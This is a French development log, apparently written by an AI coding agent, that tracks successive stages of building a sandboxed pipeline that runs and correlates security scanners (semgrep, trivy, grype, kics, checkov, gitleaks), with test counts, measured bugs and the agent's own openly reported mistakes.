  rapprochés — file d'attente et relances à concevoir avant d'y mettre du trafic.
  Détail et ce qui manque : « Clarification — LLM réel testé ≠ LLM réel validé en production ».
- **Les appréciations de la matrice viennent d'une connaissance, pas d'une vérification
  dépôt par dépôt.** Marqué comme tel dans le fichier.
- **Le classifieur automatique contient des erreurs.** Par exemple `pry0cc/axiom` classé
  provider alors que c'est un framework. Chaque ligne doit être vérifiée à la main.


## Checkov multi-framework — extension d'extraction uniquement (2026-08-28)

**Consigne respectée** : ni le clustering ni le modèle de findings n'ont été touchés.
Seuls `slice/extraction.py` (3 micro-évolutions génériques, aucun nom d'outil dans le
code) et la déclaration checkov (`capabilities.yaml`) ont changé :

- `_chemin` accepte le jeton `$` (la racine elle-même) : certains outils émettent une
  LISTE de blocs en racine, un par sous-analyse — illisible sinon en modèle déclaratif.
- `nested_key` suit un chemin pointé (`results.failed_checks`), plus seulement une clé.
- Une racine DICT (bloc isolé) se lit comme une liste d'un élément.

Déclaration checkov : `--framework terraform` retiré ; modèle `imbriqué`,
`nested_from: "$"`, contexte `cadre <- check_type`, champ `cadre` déclaré.

**Vérifié** :
- Artefact capturé versionné : `PHASE3/testrepo_iac/artefacts_captures/checkov_multiframework.json`
  (checkov 3.3.15, racine = 4 blocs : terraform 15, kubernetes 20, terraform_plan 0, dockerfile 3).
- Nouvelle batterie `PHASE3/test_extraction_blocs.py` : **14/14**, sans réseau ni outil
  exécuté, avec régressions plat/imbriqué historique et blocs malformés.
- `ATTENDUS.yaml` régénéré via `PHASE3/testrepo_iac/genere_attendus.py` (38 findings,
  3 frameworks) ; l'ancien référentiel « terraform uniquement » est remplacé.
- Exécution de bout en bout `analyser.py PHASE3/testrepo_iac` : **38 observations,
  5 clusters**, conformité ATTENDUS par framework 15/15 + 20/20 + 3/3, gravité
  `UNKNOWN` honnête, aucune fuite du faux secret. Le cluster CL-001 regroupe les 20
  findings k8s sans modification du moteur.
- Régression complète : les 12 batteries Python exit 0, `test_bwrap.sh` 11/11,
  `test_oci.sh` refuse proprement (docker absent).

**Limites actées** : `file_path` n'a pas la même base selon le contexte d'exécution
(hors sandbox : `/PHASE3/testrepo_iac/k8s.yaml` ; dans le pipeline : `/k8s.yaml`) —
chemins conservés tels que l'outil les émet. Le modèle findings étant figé, le champ
`cadre` ne survit pas jusqu'au finding final ; le framework reste identifiable par le
fichier et présent dans le JSON brut.

**Note de reprise** : le workspace a été restructuré entre deux sessions (registre à
schéma `capabilities:` imbriqué, API `provider_manifest.valider`, ATTENDUS en YAML).
Tout a été revalidé contre cette version — c'est elle la source de vérité.

## Rapport humain — gravités indéterminées (2026-08-28, chantier (b))

**Contrainte actée : ne jamais inventer de gravité. UNKNOWN ≠ LOW ≠ MEDIUM.**

Trois défauts corrigés dans `slice/rapport_humain.py` (rendu uniquement — ni le
clustering ni le modèle de findings ne bougent) :

1. « Aucun problème grave » s'affichait quand TOUTES les observations étaient sans
   gravité : un mensonge par omission (on ne sait pas qu'elles ne sont pas graves,
   on sait qu'elles n'ont pas été évaluées). Remplacé par un constat explicite :
   « Aucune des 38 observations regroupées n'a de gravité fournie (5 regroupements) :
   rien n'a pu être classé par urgence. »
2. Nouvelle section « Gravité indéterminée — ce que ça veut dire » : le compte exact,
   l'outil responsable nommé, « indéterminée ≠ faible », et la conduite à tenir
   (impact, exposition, contexte).
3. Table « Comment lire ce rapport » complétée : gravité indéterminée = non évalué,
   ce n'est ni faible ni moyen.

**Vérifié** : nouvelle batterie `PHASE3/test_rapport_humain.py` **18/18** (findings
synthétiques sur le schéma réel, aucun outil exécuté) — cas tout-inconnu, tout-évalué,
mixte, isolé, vide, et interdiction de toute gravité fabriquée. Exécution réelle sur
`testrepo_iac` : le rapport dit 38 observations sans gravité, nomme checkov, aucune
gravité inventée. Régression complète : 14 batteries Python exit 0 + bwrap 11/11.

## Pause architecture — sélection des providers (2026-08-28)

Note complète : `PHASE3/PAUSE_ARCHITECTURE_SELECTION.md`. Faits vérifiés dans le
code du jour : `choisir_providers` = `passifs[0]` (ordre YAML, intent.py:187-199) ;
AUCUNE capacité n'a deux providers aujourd'hui ; `plan.json` trace le choix sans
motif ; les `preconditions` du registre ne sont évaluées par aucun code ; la
corrélation inter-outils est impossible au sein d'une capacité (mono-provider).
Recommandation : priorité explicite + motif traçable dans plan.json maintenant ;
fan-out intra-capacité seulement quand un second provider existera — la vraie
question sera alors « les deux, ou un seul faute de budget », pas « lequel ».
Décision en attente utilisateur.

## Sélection des providers — option 1 implémentée (2026-08-28)

Décision utilisateur : priorité explicite + motif traçable, maintenant ; le
fan-out attendra un second provider réel. Implémentation : `priorite:` au
registre (entier, défaut 100), tri stable dans `choisir_providers`, bloc
`selection` dans plan.json (choisis/écartés/motif, hors empreinte — rejeu
intact, version de plan inchangée). Motifs honnêtes : « seul provider PASSIF »,
« priorité déclarée la plus forte ; écartés : … », « imposée par l'appelant ».
Vérifié : `test_selection.py` 13/13 (arbitrage réel sur registre temporaire),
16 portes vertes (15 batteries + bwrap), exécution réelle : 38 observations et
plan_id `08db897365d68278` avec sélection tracée. Prochain chantier acté :
dogfooding sur dépôts réels, puis corrélation JS si la cécité npm est confirmée
en pratique.

## Dogfooding — campagne 1 (2026-08-28)

Bilan complet : `PHASE3/DOGFOODING_BILAN.md`. Règle tenue : mesurer, ne rien coder.
5 dépôts réels (Python, JS×2, Go, Terraform), 4 runs aboutis, 1 crash.
FAIT MAJEUR : le garde-fou anti-fuite bloque TOUTE analyse npm — son motif
« 40 caractères base64 » inclut '/' et matche les URL d'advisories GitHub
(GHSA) ; sur axios, PipelineError et perte de tous les résultats (le finding
déclencheur était une vraie vulnérabilité : vite 5.4.21, CVE-2026-53571, HIGH).
Conséquence : la corrélation JS/npm reste non mesurable — l'hypothèse « mapping
npm nécessaire » n'est ni confirmée ni infirmée, elle est bloquée par ce bug.
Aussi mesuré : 41/41 findings express dans examples/ (bruit), sur-regroupement
same_package (41→1 cluster), couverture Go sans SAST (mais checkov a trouvé un
VRAI problème GitHub Actions sur le dépôt Go — multi-framework validé par le
réel), gitleaks honnête sur 6163 commits. Aucune correction codée : la roadmap
proposée attend la décision utilisateur (priorité 1 = corriger le motif, pas le
principe).

## Correctif garde-fou + campagne JS 2 (2026-08-28)

Point 1 du bilan validé et corrigé : l'heuristique 40 caractères du jeu LARGE ne
s'applique plus qu'HORS contexte infrastructure (URL, chemins 3 segments et +) ;
motifs stricts inchangés sur texte intégral. Trois itérations pilotées par les
tests (24 cas porte bloquante) — au passage : trou des clés 41+ caractères comblé,
faux positifs URL Fedora / chemins d'artefacts éliminés. 16 portes vertes.
Campagne JS relancée (axios exit 0 — crash résolu ; express ; eslint) :
cécité npm CONFIRMÉE mécaniquement (semgrep JS : package None ou métadonnée de
règle ; trivy : vrai paquet — aucune clé commune) mais AUCUNE occasion de
corrélation manquée sur 3 dépôts. Second aveuglement mesuré : chemins non
normalisés entre outils (semgrep absolu sandbox / checkov module / trivy relatif)
→ same_file inter-outils impossible. Décision proposée : pas de mapping npm
maintenant ; normalisation des chemins = candidat prioritaire (décision
utilisateur en attente).

## Normalisation des chemins (2026-08-29)

Décision utilisateur après campagne 2. Implémentation : `normalise_chemin()`
dans findings.py (racines connues retirées, slash meneur = convention checkov
relativisé, aucun filesystem touché) ; `racines` traversé jusqu'aux 4
normaliseurs + depuis_manifest ; le pipeline passe (montage, cible). Les
fingerprints sont désormais calculés sur des chemins relatifs — identité
indépendante du point de montage et de la machine. gitleaks conserve son
Fingerprint maison (basé commit) : non affecté. Vérifié : test_chemins.py 9/9
(artefact eslint réel + preuve d'indépendance machine : deux montages
différents → mêmes fingerprints) ; 17 portes vertes ; e2e eslint 75 findings
0 absolu, cible_independante 11 findings et 2/2 clusters inter-outils préservés.

**Deux incidents d'environnement mesurés ce jour** (aucun lien avec le code) :
1. reset du sandbox EN COURS de tour (cache + pip volatils) — signe distinctif :
   échec instantané de toutes les batteries ; remediation = bootstrap (exit 0,
   ~4 min) puis tout revérifier ;
2. le snapshot du workspace a tronqué le plus gros .git (eslint) : gitleaks a
   honnêtement déclaré « dépôt sans historique git » — reclone fait (commit
   8724829f6), le finding .travis.yml est revenu. Leçon : les clones de
   dogfooding doivent être vérifiés (.git présent) avant chaque campagne.

## Capacité Go — provider semgrep_go (2026-08-29, chantier largeur-Go, clos)
Premier pas du programme A+B (besoin mesuré : mux, dépôt Go, 0 règle semgrep ne
portait — cécité totale sur le langage). Choix utilisateur validé par ask_user.

**Gosec écarté, et pourquoi** : installé puis mesuré (v2.29.0, sha relevé) — il
exige le TOOLCHAIN GO dans l'isolateur (« go command required ») : c'est un
chantier d'isolateur, pas de déclaration. Reporté et documenté (binaire retiré du
cache). Fourni à la place : provider `semgrep_go` (nouvelle capacité PUBLIQUE
CODE_STATIC_ANALYSIS_GO, zéro binaire nouveau, règles p/golang épinglées
sha 7c08b953… dans manifeste_dependances + boucle bootstrap + contrôle divergence).

**Intégration (chaîne de montage manifest, 3e preuve)** : fixture
PHASE3/testrepo_go (code Go vulnérable + go.mod avec x/text v0.3.0 + faux jeton
ghp_ réutilisé de testrepo — la clé AWS d'exemple est sur liste blanche gitleaks,
mesuré) ; artefacts capturés (semgrep_go 2, trivy 4 CVE, gitleaks 1) ;
ATTENDUS.yaml + genere_attendus.py ; batterie test_go.py 18/18 (dont convergence
hors-ligne gitleaks×semgrep_go sur main.go et garde « django » ne matche pas le
mot-clé « golang ») ; intent : mot-clé « golang » uniquement ; test_niveau2 7f
étendu (attentes extensibles).

**Un ajout au cœur, déclaratif** : `nettoyage_regle` dans le schéma Extraction —
le nettoyage canonique des ids semgrep (préfixe de chemin de montage non
déterministe) était clé sur l'outil « semgrep » ; il est désormais DÉCLARÉ par
le manifest et validé au chargement (nom inconnu = refusé). Le cœur n'ajoute
pas de nom d'outil.

**e2e testrepo_go (2026-08-29)** : 5 providers planifiés (générique), 9 findings
(semgrep 2, semgrep_go 2, trivy 4, gitleaks 1), 2 clusters inter-outils sur
main.go (gitleaks+semgrep+semgrep_go ; semgrep+semgrep_go ligne_proche) — la
convergence promise est mesurée. 0 chemin absolu, 0 fuite de secret de fixture,
checkov honnêtement not_scanned.

**Écart trouvé et corrigé dans la foulée** : trivy produisait 4 findings tout en
déclarant « not_scanned : aucun manifeste exploitable » — MANIFESTES connaissait
go.sum mais pas go.mod (que trivy analyse seul, prouvé). go.mod ajouté
(adapters.py, 1 ligne) ; couverture vérifiée : analysé=['go.mod'].

**Régression complète : 17/17 batteries vertes** (26+9+7+14+18+22+11+32+27+21+
20+18+24+13+10+12 + généralisation indépendante), après un 3e reset sandbox
mesuré ce jour (cache volatil perdu, workspace intact, .git OK — bootstrap
exit 0 en ~15 s cette fois, DB re-téléchargée).

**Conception gelée entre-temps** (3 revues externes successives) : architecture
cible validée GO — Source→Tool→Provider→Execution, pool dérivé ≠ runtime,
qualification ≠ autorisation, harnais goulot unique, Mission append-only,
Hypothèse≠Observation≠Finding≠Action, scope déclaré/résolu/effectif, LLM =
heuristique de proposition (ensemble candidat réduit avant), 23 invariants,
5 tests ultimes à construire. Séquence de construction en 9 étapes actée ;
étape 2 (objet Tool + pool.yaml) en attente du feu vert utilisateur.

## Étape 2 — objet Tool, pool dérivé, mission minimale (2026-08-29)
Première étape de la séquence gelée (après GO utilisateur ; architecture inchangée).

**1. Objet Tool (`slice/outils.py`)** — formalise l'existant sans le déplacer :
manifeste_dependances.yaml devient le registre des tools (id, installation
binaire|pip, version, sha256/distribution_hash, source, LICENCE ajoutée aux 6
entrées, role outil|moteur — opa = moteur). Invariants vérifiés : binaire des
tools ⊆ whitelist ; entrée incomplète = refus au chargement. `tool_id` ajouté au
schéma Manifest (OPTIONNEL = compatibilité ascendante, vérifié au chargement :
connu, rôle outil, cohérent avec le binaire). 4 manifests déclarés :
bandit+bandit_custom → bandit, semgrep_go → semgrep, checkov → checkov
(un tool partagé = UNE installation). Adapters legacy non migrés (consigne).

**2. pool.yaml (VUE DÉRIVÉE)** — `genere_pool.py` depuis 07_CATALOGUE + 08_FICHES
+ registre + tools ; empreintes des sources en en-tête ; 309 entrées
(6 integrated / 303 non_approuve), 15 lignes sans owner_repo exclues et
comptées (défaut de données Phase 1 : 15 sur le catalogue entier, pas 3 — les
« 3 » mesurés plus tôt ne portaient que sur le sous-ensemble role=provider).
Double axe de statuts conforme au gel (technique/opérationnel). Le runtime ne
lit JAMAIS le pool : vérifié par test (aucune référence dans slice/, falsification
sans effet sur l'empreinte du registre).

**3. Mission minimale (`slice/mission.py`)** — dossier append-only
(artifacts/missions/<id>/mission.json + journal.jsonl) ; événements journalisés
par le pipeline : ouverture → (arret intent|policy le cas échéant) → plan →
contexte (digest cible, empreinte contexte, run_id) → execution par provider →
cloture. Append strict vérifié (préfixe immuable, seq consécutif, relecture).
Pas d'hypothèses ni d'itérations (étapes ultérieures, non construites).

**Batterie `test_outils_pool_mission.py` : 19/19** (dont e2e pipeline réel sur
testrepo_go avec mission journalisée de bout en bout). Régression complète :
**18/18 vertes** (26+9+7+14+18+22+11+32+27+21+20+18+24+13+10+12+19 + indé.).

**Incident d'environnement n°4 (nouvelle leçon)** : un script python en heredoc
interrompu par timeout a laissé son coprocessus VIVANT (boucle infinie en
mémoire, 99 % CPU pendant 40 min) → OOM et `exit=137` sur les batteries suivantes.
Signature distincte du reset sandbox : les binaires sont présents. Remédiation :
`ps aux --sort=-%mem`, tuer le fugitif. Leçon : après un timeout de commande,
vérifier les processus survivants avant de diagnostiquer le code.

## Étape 3 — applicabilité, fan-out, montages par exécution (2026-08-29)
Deuxième étape de la séquence gelée (GO utilisateur). Préalable à tout
élargissement du pool (risque R1 : un pool qui grandit sans sélection visible
ne sert à rien).

**1. Applicabilité déclarative (PRÉ-exécution)** — champ `applicabilite.globs`
au manifest ; `plan.inventaire()` (liste déterministe, triée, .git exclu,
bornée) + `plan.filtrer_applicabilite()` : un provider dont AUCUN fichier de la
cible ne matche ses globs est écarté AVANT le plan, avec motif tracé dans
plan.json (selection.applicabilite) et événement « applicabilite » dans la
mission. Sans déclaration = toujours éligible (une fausse exclusion est pire
qu'un not_scanned honnête). Déclaré : semgrep_go (*.go), bandit/bandit_custom
(*.py). checkov NON déclaré (6 frameworks, risque de fausse exclusion — son
not_scanned honnête suffit). Si TOUS les providers sont inapplicables : arrêt
honnête « applicabilite », pas un échec. Effet mesuré : sur testrepo (Python),
semgrep_go est écarté avant exécution (4 providers au lieu de 5) ; sur
testrepo_go il reste. Point documenté : le filtre vit dans le PIPELINE — un
appelant qui construit un plan à la main (les tests seulement) ne l'emprunte pas.

**2. Fan-out borné** — `mode_selection: un_seul|fan_out` + `max_providers`
par capacité (registre, validé au chargement ; défaut un_seul = comportement
historique inchangé). `choisir_providers` applique le mode dans l'ordre de
priorité ; `plan.construire` trace le motif fan_out (choisis + écartés nommés).
Budget global : `MAX_ETAPES = 12`, dépassement = PlanError (garde-fou
anti-explosion, ordinal — le coût vectoriel viendra plus tard). AUCUNE capacité
réelle n'est passée en fan_out : pas de 2e provider réel aujourd'hui (décision
gelée) — le mécanisme est prouvé sur registre synthétique (test).

**3. Montages par exécution** — les points de montage Sandbox deviennent des
champs d'INSTANCE (défauts = chemins historiques, inchangés) ; les adapters
lisent sbx.M_SCAN/M_OUT au lieu des constantes de module. Deux sandboxes
indépendantes vérifiées — pré-requis du parallélisme (NON construit, conforme
au périmètre).

**Batterie `test_fanout.py` : 13/13** (applicabilité déclarée/déterministe/
motivée, fan-out synthétique borné + motifs, budget refusé, montages par
défaut identiques + instances indépendantes, 2 e2e réels Go/Python).

**Régression complète : 19/19 batteries vertes.** Deux changements de compte
JUSTIFIÉS (règle « test modifié = justification écrite ») : (a) test_bundle
26→24 cas : ses cas sont dynamiques par fichier raw_*.json — semgrep_go écarté
de testrepo = un raw de moins, AUCUN contrôle supprimé ; (b) test_slice inchangé
(10/10) : son plan est construit à la main (hors filtre, par conception) et ses
assertions d'exécution sont dynamiques — 4 codes d'outils au lieu de 5.
pool.yaml régénéré (empreinte du registre changée) — test pool 19/19.

---

## Étape 4 — Harnais de qualification v1 + premiers providers du pool (2026-08-29)

**GO utilisateur** (relais du conseiller) : harnais de qualification + intégrations
PASSIF du pool. Livré : le harnais, DEUX providers réels (grype → 2e
DEPENDENCY_ANALYSIS, kics → 2e IAC_SCAN) et les premiers fan-out réels.

**1. Harnais (`PHASE3/harnais.py` + `harnais_grype_kics.py`)** — qualification par
PREUVES, pas par verdict : exécution dans la sandbox réelle (placeholders résolus
COMME le runtime : {BIN}/{TARGET}/{OUT}/{OUT_DIR}/{REGLES}/{DB}), artefact brut +
méta (code, durée, env), `stabilite()` = 2e exécution comparée (octets ET contenu
normalisé), ATTENDUS régénérables, dossiers de qualification. L'approbation reste
humaine — le harnais ne touche ni au pool, ni à la whitelist.

**2. Outils épinglés (artefacts mesurés, pas annonces)** — grype 0.118.0
(binaire sha 91705979…, tarball 6a9208e4…) ; kics 2.1.20 (binaire d3bb1923…,
tarball 8a5aa375… vérifié contre checksums.txt ; v2.1.21 publiée SANS binaires).
Fait mesuré : la bibliothèque de requêtes kics (1810 fichiers OPA) n'est PAS dans
le tarball binaire — elle vient de l'asset officiel `extracted-info.zip`
(sha 305fd652…), installée sous `rules/kics/queries` (bootstrap, empreinte vérifiée).
Base grype ~2 Go sous `trivy-cache/grype`.

**3. Qualification (exécutions sandbox réelles)** — grype : 62 findings, code 0,
5,8 s, JSON stdout. kics : 46 requêtes → 110 findings, code 60 (= détections,
convention kics mesurée), 32,5 s, fichier `{OUT_DIR}/kics.json`. Stabilité :
octets NON identiques (horodatages, ordre d'énumération Go — mesuré), CONTENU
normalisé identique pour les deux. Convergence trivy×grype : 62/62 findings,
**6/6 paquets communs** ; namespaces distincts (grype=GHSA-*, trivy=CVE-*, aucun
alias dans les sorties) → la convergence est par PAQUET, jamais par identifiant.

**4. Extensions déclaratives (3, chacune sur occurrence observée, aucune ne
modifie le modèle d'objets)** :
- `paquet` dans extraction.champs : les matches grype sont au niveau paquet, sans
  fichier ; ses ids GHSA n'existent dans aucun mapping → package=None cassait la
  convergence. L'outil DÉCLARE le paquet (method=declare_par_l_outil), le cœur ne
  déduit rien ; repli mapping inchangé.
- `env` au manifest : grype 0.118 n'a AUCUN flag de cache DB (--db-cache-dir
  « unknown flag », mesuré) — uniquement GRYPE_DB_CACHE_DIR. Validé comme argv
  (nom de variable, placeholders connus, fragments interdits), résolu par le cœur.
- `{OUT_DIR}` : kics --output-path exige un RÉPERTOIRE (sinon aide + échec) ;
  {OUT} reste le fichier. --output-name aligne kics.json sur ce que le cœur lit.

**5. Deux mesures fausses corrigées (garde-fou n°2)** :
- `run._sha256` : `read_bytes()[:1Mo]` chargeait le fichier ENTIER en mémoire.
  La base grype (fichier SQLite ~1,4 Go) tuait le pipeline par OOM (machine à
  2 Go de RAM) AVANT la première exécution. Lecture par blocs — empreintes
  inchangées (troncature 1 Mo identique), seule la mémoire change.
- `sandbox.CACHE_DB` pointait `trivy-cache/trivy` : le montage M_DB n'exposait
  que la base trivy — grype échouait « database does not exist » dans le pipeline
  alors que le harnais (montage parent manuel) passait. CACHE_DB = le PARENT
  `trivy-cache` ; chaque outil vise son sous-répertoire ({DB}/trivy, {DB}/grype).
- clusterer : un id de vulnérabilité n'est pas seulement CVE-* — sans GHSA- dans
  le prédicat, les findings grype tombaient côté « usage » et déclenchaient un
  same_dependency_usage FAUX entre deux outils de dépendances.

**6. Déclarations** — capabilities.yaml : providers grype/kics par manifest
(complet, avec limites documentées) ; DEPENDENCY_ANALYSIS et IAC_SCAN en
`fan_out` max 2 (priorités 100 trivy/checkov, 110 grype/kics). Whitelist +=
grype, kics. Globs : grype = lockfiles/manifests de dépendances ; kics =
*.tf/*.tfvars/*.yaml/*.yml/Dockerfile — PAS *.json (collision package.json,
limite documentée : IaC JSON non couvert). pool.yaml régénéré : 309 entrées,
**8 intégrés**, 301 non_approuve.

**7. Tests** — nouvelle batterie `test_grype_kics.py` : **30/30** (déclarations,
validation env négative, applicabilité sur inventaires réels+synthétique,
extraction vs ATTENDUS hors-ligne, convergence 6 clusters paquet: cross_tool SANS
same_dependency_usage, e2e testrepo_sca = fan-out réel 62+62 findings + 6
clusters inter-outils + 0 fuite, plan IaC fan_out). Modifications JUSTIFIÉES :
test_niveau2 7f (ensemble autorisé += grype, kics — motif « attentes
extensibles », intégrations décidées) ; test_selection 4a/4b/7b (assertait le
motif un_seul d'IAC_SCAN, passé en fan_out — même intention « motif honnête
tracé », aucun contrôle supprimé).

**Régression complète : 20/20 batteries vertes** (test_llm_reel : saut
environnemental, GROQ_API_KEY absente — inchangé). test_slice, test_bundle,
test_extraction_blocs, test_niveau2, test_fanout passent SANS modification
(comptes dynamiques). Bootstrap rejoué : exit 0.

**Leçons** : épingler sur des artefacts mesurés (checksums.txt), pas sur le tag
latest ni sur un téléchargement unique (taille anormale observée : 96,9 Mo vs
30 Mo — ré-extraction officielle, empreinte binaire identique) ; l'erreur réelle
d'un CLI est en TÊTE de stderr, pas en queue ; les fixtures portant un
ATTENDUS.yaml rendent kics légitimement éligible dessus (pas une exclusion à
asserte) ; la machine de travail a 2 Go de RAM — toute lecture intégrale de gros
fichier est un risque.

**Dettes notées (non traitées, conformément à la consigne)** : providers legacy
(semgrep, gitleaks, checkov) sans applicabilité déclarable (pas de manifest) —
semgrep tourne sur des cibles sans Python ; grype tente un appel réseau de
version (WARN inoffensif, sandbox sans réseau) ; `cadre` déclaré au manifest
checkov n'atteint pas le Finding normalisé.

---

## Étape 5 — Dogfooding sur cibles réelles (2026-08-29)

**GO utilisateur** avec trois garde-fous validés : (1) le LLM propose, le moteur
décide — aucune décision d'exécution prise par un modèle dans cette étape ;
(2) aucun provider sans qualification — aucun outil ajouté ; (3) étape PASSIVE —
quatre dépôts publics clonés, scannés hors réseau, jamais lancés.

**Dispositif.** `PHASE3/dogfooding/` : `TARGETS.yaml` (4 cibles, commits figés,
profils complémentaires), `lancer.py` (exécute le pipeline EXISTANT, mesure,
persiste plan/rapport/clusters/raw/METRIQUES/RAPPORT.md), preuves dans
`rapports/<cible>/`. Aucune logique nouvelle dans le moteur.

| Cible | Commit | Durée | Findings | Clusters inter-outils |
|---|---|---|---|---|
| gorilla/mux (Go) | db9d1d0 | 121 s | 5 | 0 (honnête) |
| terraform-aws-vpc (77 .tf) | cf0e3ca | 137 s | 112 | **10** |
| psf/requests (Python) | 5460f46 | 56 s | 14 | 0 (honnête) |
| mochajs/mocha (JS + lockfile) | e6b9ee7 | 38 s | 38 | **12** |

Aucune erreur d'exécution, aucun OOM (2 Go de RAM), applicabilité honnête dans
les deux sens (grype écarté de mux/terraform-aws-vpc avec motif tracé).
Convergence SCA réelle sur mocha : 11/11 paquets communs, décomptes identiques,
12 clusters `cross_tool, same_package, related_dependency`.

**Trois mesures fausses corrigées (garde-fou n°2), chacune sur occurrence
observée** :
- **C1** kics `code_succes` : `[0, 60]` venait d'UNE observation (CRITICAL) ;
  mux (LOW) a produit 30 → provider en échec à tort. Échelle complète
  `[0, 20, 30, 40, 50, 60]` (documentation + 2 mesures). Test 1e modifié avec
  justification.
- **C2** cwd sandbox non déterministe : bwrap héritait du cwd du parent et kics
  relativise ses chemins — les MÊMES fichiers portaient des identifiants
  différents selon le point de lancement, la corrélation inter-outils était
  aveugle. Fix `--chdir {M_SCAN}`. Mesure : clusters inter-outils
  terraform-aws-vpc **0 → 10**. ATTENDUS testrepo_iac régénérés.
- **C3** rapport humain : `split('/')[-1]` affichait deux fois
  « package-lock.json » pour `docs/package-lock.json` + `package-lock.json` —
  deux fichiers réels rendus indiscernables. Chemins complets.

**Observé, non corrigé (détail dans `dogfooding/OBSERVATIONS_dogfooding.md`)** :
`not_scanned` quand un outil scanne et ne trouve rien (O1, sous-déclare sans
jamais sur-déclarer) ; codes de sortie kics non totalement prévisibles (O2) ;
providers IaC couvrant légitimement GitHub Actions (O3) ; divergence trivy/grype
sur `requirements-dev.txt` (O4) ; clés privées de fixtures de test remontées par
gitleaks, masquées à la source (O5) ; semgrep legacy tournant sur toutes les
cibles, dette confirmée et chiffrée ~15-30 s (O6).

**Test modifié avec justification** : `test_independant` — l'égalité stricte
`outils == [semgrep, trivy]` datait d'avant le fan_out ; grype est désormais un
second observateur des CVE sur paquets et le cluster PyYAML mêle
`grype+semgrep+trivy`, ce qui est le comportement voulu. Contrôle conservé sous
forme d'inclusion.

pool.yaml régénéré (empreinte du registre changée par C1).
**Régression complète : 20/20 batteries vertes** après C1+C2+C3
(test_llm_reel : saut environnemental, clé absente).

---

## Étape 6 — chemin d'utilisation minimal + branchement LLM de l'intention (2026-08-29)

**Livrable** : `PHASE3/analyser.py` (point d'entrée), `PHASE3/test_utilisation.py`
(15 cas), `README_USAGE.md`, F2 + F3 dans `slice/intent.py`.

Le LLM ne pilote **que le matching d'intention, dans le catalogue déclaré** : sa
sortie est validée contre le registre, tout échec retombe sur le déterministe et le
repli est tracé (`moteur = "deterministe(repli:<cause>)"`). Aucun nom d'outil ni
chemin ne lui est transmis. `--moteur auto` choisit le LLM si `GROQ_API_KEY` est
présente et **le dit** à l'écran.

**F2** : l'expansion générique ne s'applique que si aucun domaine n'est nommé —
« Analyse mon code Terraform » → {CODE_STATIC_ANALYSIS, IAC_SCAN}, plus les 5
capacités publiques. « sécurité » n'est mot-clé d'aucune capacité, donc
« scan de sécurité complet du dépôt » reste un audit complet (cas historique).
**F3** : la question de clarification ne liste que des capacités publiques — les
identifiants internes (`..._SUITE`) sont du vocabulaire de test.

### Deux régressions causées par cette étape, trouvées par la régression

1. **`analyser.py` écrasé.** Je l'ai réécrit pour l'étape 6 alors qu'il existait
   déjà (Phase 4 : bundle indexé, `rapport.sarif`, `manifeste.json`,
   conservation/masquage des sorties) et j'ai inversé l'ordre des arguments
   (`<mission> <cible>` au lieu de `<dépôt> [requête]`). Conséquence mesurée :
   `test_rapport` 17/20, `test_bundle` 25/26, et tout appel déjà écrit cassé.
   **Corrigé par fusion, pas par choix** : signature et bundle Phase 4 restaurés
   (SARIF, manifeste, 13 fichiers vérifiés à l'exécution), archive de mission de
   l'étape 6 conservée en plus → 20/20 et 26/26.
2. **Faux positif de mot-clé.** `"sca"` est une sous-chaîne de « **sca**n » :
   « scan de sécurité complet du dépôt » matchait DEPENDENCY_ANALYSIS, et la
   condition F2 `not trouvees` bloquait alors l'expansion générique — la demande
   se réduisait à une seule capacité. La règle F2 était **innocente** ; c'est le
   matching en sous-chaîne qui était faux. Corrigé par `_contient()` : matching
   en **mot entier**, appliqué aux 4 tables (MOTIFS, GENERIC, AMBIGU, INTERDIT).

Leçon : **avant de créer un fichier, vérifier s'il existe déjà.** J'ai annoncé
15/15 sur la seule batterie que j'avais écrite, sans lancer la régression — les
deux régressions sont passées à travers.

### Dette ajoutée (observée, non corrigée)

`intent.py` ne normalise pas les accents alors que `plan.requete_canonique` les
retire : « vérifie les **dependances** » → `needs_clarification`, alors que
« vérifie les dépendances » → DEPENDENCY_ANALYSIS. Vérifié à l'exécution. Ce
n'est pas nouveau avec le matching en mot entier. À traiter avec F5
(formulations non-expertes), pas à chaud.

### Régression

21/22 batteries vertes. `test_llm_reel` : saut environnemental (`GROQ_API_KEY`
absente) — le mode `llm` en CLI retombe sur le déterministe, désormais **affiché**
(`moteur effectif : deterministe(repli:reponse_vide)`) au lieu d'un « llm » trompeur.
Détail : intentions 22 · sélection 13 · llm 32 · manifeste 27 · corrélation 7 ·
chemins 9 · niveau2 21 · fanout 13 · traçabilité 12 · rapport 20 · rapport_humain 18 ·
slice 10 · bundle 26 · isolateur 11 · extraction_blocs 14 · go 18 · indépendant 10 ·
outils_pool_mission 19 · grype_kics 30 · sécurité (porte ouverte) · utilisation 15.

---

## Étape 6bis — armement de la confiance de cible sur le chemin utilisateur (2026-08-30)

**Déclencheur, mesuré avant de coder.** `policy.rego:91-97` refuse une cible
`untrusted` tant que la mémoire n'est pas bornée ; `profils.py` documente cette
fermeture ; `test_intentions.py:122-133` la prouve. Mais `analyser.py` appelait
`pipeline.executer(requete, cible)` **sans** `confiance_cible` : la valeur par défaut
`controlled` était donc imposée par le point d'entrée, et `cible_autorisee` aussi
(vaut `True`, jamais mis à `false` hors tests). La garde existait, elle n'était
armable par personne d'autre qu'une batterie. Chantier : rendre la décision accessible,
ne rien réarchitecturer — `policy.rego` et le modèle de plan sont restés intouchés.

**Ce qui a été fait** (test-first : la section G de `test_utilisation.py` a d'abord
rougi sur `_options_depuis_argv` inexistant, puis implémentation) :

- `analyser.py` : `--confiance controlled|untrusted` (formes `=` et espacée), défaut
  `controlled` **affiché** avec la mention « aucune évaluation de la cible n'a été
  faite » ; valeur inconnue ou drapeau nu → `ERREUR`, code 1, **avant** toute création
  de dossier de mission. Un seul extracteur `_options_depuis_argv()` pour les deux
  drapeaux, seule source des valeurs admises.
- `pipeline.executer()` : `CONFIANCES = ("controlled", "untrusted")` et refus par
  `PipelineError` si la valeur est hors liste — le contrôle vit dans la bibliothèque,
  pas dans la CLI, sinon tout appelant tiers l'évite. Consignation
  `MS.consigner(miss, "confiance", …)` **avant** la policy : le dossier de mission
  append-only garde la trace de ce qui a été cru de la cible, même en cas de refus ou
  d'OPA indisponible. Le `profil` est désormais renseigné sur l'`Execution` de refus
  (un refus qui ne nomme pas le profil qui refuse ne se relit pas).
- `manifeste.json` et `run.json` portent `confiance_cible` ; `manifeste.json` porte
  aussi `decision_policy` (le motif du refus est une donnée de la mission, pas seulement
  une ligne console).
- `README_USAGE.md`, `CONTRAT_PUBLIC.md` §4, et note de correction dans
  `STATUT_PHASE3.md` §6quinquies.

**Deux incidents trouvés en route, chacun mesuré avant d'être corrigé.**

